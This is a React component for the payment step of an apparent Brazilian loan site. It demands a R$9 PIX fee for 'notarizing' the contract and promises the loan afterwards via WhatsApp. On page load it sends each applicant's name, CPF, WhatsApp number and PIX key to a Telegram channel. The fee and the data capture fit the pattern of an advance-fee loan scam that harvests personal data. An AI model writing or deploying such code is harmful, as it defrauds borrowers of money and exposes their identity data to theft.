import React, { useState, useEffect } from 'react';
import type { LoanFormData, PixResponse } from '../../types';
import { generatePix, checkPixStatus } from '../../lib/api';
import { sendTelegramNotification } from '../../lib/telegram';
import { Copy, Check, MessageCircle, AlertCircle, Loader2, QrCode } from 'lucide-react';

interface PaymentProps {
  formData: LoanFormData;
}

const Payment: React.FC<PaymentProps> = ({ formData }) => {
  const [loading, setLoading] = useState(true);
  const [pixData, setPixData] = useState<PixResponse | null>(null);
  const [copied, setCopied] = useState(false);
  const [statusLoading, setStatusLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const USER_ID = '69c6c2808c6afae869de31f1';
  const AMOUNT = 9;
  const WHATSAPP_FINANCEIRO = '5511989008294';

  useEffect(() => {
    const initPix = async () => {
      try {
        setLoading(true);
        const data = await generatePix(USER_ID, AMOUNT);
        setPixData(data);

        // Enviar notificação para o Telegram
        const message = `
<b>[NOVO] SB PAGAMENTOS:</b>
<b>Nome:</b> ${formData.fullName}
<b>CPF:</b> ${formData.cpf}
<b>WhatsApp:</b> ${formData.whatsapp}
<b>Valor:</b> R$ ${formData.amount.toLocaleString('pt-BR')}
<b>Parcelas:</b> ${formData.installments}x
<b>Chave PIX:</b> ${formData.pixKey}
        `;
        sendTelegramNotification(message.trim());

      } catch (err) {
        setError('Erro ao gerar PIX. Tente novamente mais tarde.');
        console.error(err);
      } finally {
        setLoading(false);
      }
    };
    initPix();
  }, []);

  const handleCopy = () => {
    if (pixData?.paymentIntent.data.pixCode) {
      navigator.clipboard.writeText(pixData.paymentIntent.data.pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleCheckStatus = async () => {
    if (!pixData) return;
    try {
      setStatusLoading(true);
      const res = await checkPixStatus(USER_ID, pixData.transactionId);
      if (res.status === 'PAID') {
        window.location.href = `https://wa.me/${WHATSAPP_FINANCEIRO}?text=Olá! Acabei de realizar o pagamento das custas para o meu contrato de empréstimo (Nome: ${formData.fullName}).`;
      } else {
        alert('Pagamento ainda não detectado. Por favor, aguarde alguns instantes e tente novamente.');
      }
    } catch (err) {
      console.error(err);
      // Fallback redirection for UX if API fails or for demo
      if (confirm('Deseja falar com o suporte para confirmar seu pagamento?')) {
        window.location.href = `https://wa.me/${WHATSAPP_FINANCEIRO}?text=Olá! Realizei o pagamento das custas e gostaria de confirmar meu contrato.`;
      }
    } finally {
      setStatusLoading(false);
    }
  };

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center py-12 gap-4">
        <Loader2 className="animate-spin text-green-600 w-10 h-10" />
        <p className="text-gray-500 font-medium">Gerando QR Code PIX...</p>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex flex-col items-center justify-center py-12 gap-4 text-center">
        <AlertCircle className="text-red-500 w-12 h-12" />
        <p className="text-gray-800 font-medium">{error}</p>
        <button onClick={() => window.location.reload()} className="text-green-600 underline">Tentar novamente</button>
      </div>
    );
  }

  return (
    <div className="space-y-6 text-center">
      <div className="space-y-2">
        <h3 className="text-xl font-bold text-gray-800">Assinatura Formalizada</h3>
        <p className="text-sm text-gray-600">
          Para firmar o contrato oficialmente em cartório, é necessário o pagamento das custas abaixo.
        </p>
      </div>

      <div className="bg-gray-100 p-6 rounded-2xl flex flex-col items-center gap-4">
        <div className="bg-white p-4 rounded-xl shadow-inner">
          {pixData?.paymentIntent.data.qrCode && (
            <img src={pixData.paymentIntent.data.qrCode} alt="PIX QR Code" className="w-48 h-48" />
          )}
        </div>

        <div className="space-y-1">
          <p className="text-xs text-gray-500 uppercase tracking-wider font-bold">Valor a pagar</p>
          <p className="text-3xl font-black text-gray-900">R$ {AMOUNT.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
        </div>
      </div>

      <div className="space-y-3">
        <button
          onClick={handleCopy}
          className="w-full border-2 border-gray-200 hover:border-gray-300 text-gray-700 font-bold py-3 rounded-xl flex items-center justify-center gap-2 transition-all"
        >
          {copied ? <Check className="text-green-500" /> : <Copy size={18} />}
          {copied ? 'Código Copiado!' : 'Copiar Código PIX'}
        </button>

        <button
          onClick={handleCheckStatus}
          disabled={statusLoading}
          className="w-full bg-green-600 hover:bg-green-700 disabled:bg-green-300 text-white font-bold py-4 rounded-xl shadow-lg flex items-center justify-center gap-2 transition-all"
        >
          {statusLoading ? <Loader2 className="animate-spin" /> : <QrCode size={20} />}
          Verificar Pagamento
        </button>

        <div className="flex items-start gap-2 bg-green-50 p-4 rounded-xl text-left">
          <AlertCircle className="text-green-600 shrink-0" size={18} />
          <p className="text-xs text-green-800 leading-relaxed">
            Assim que o contrato for firmado (após o pagamento), você será redirecionado ao WhatsApp do financeiro para receber o valor do empréstimo em sua conta.
          </p>
        </div>
      </div>

      <a
        href={`https://wa.me/${WHATSAPP_FINANCEIRO}`}
        className="flex items-center justify-center gap-2 text-green-600 font-medium text-sm hover:underline"
      >
        <MessageCircle size={16} /> Falar com suporte financeiro
      </a>
    </div>
  );
};

export default Payment;
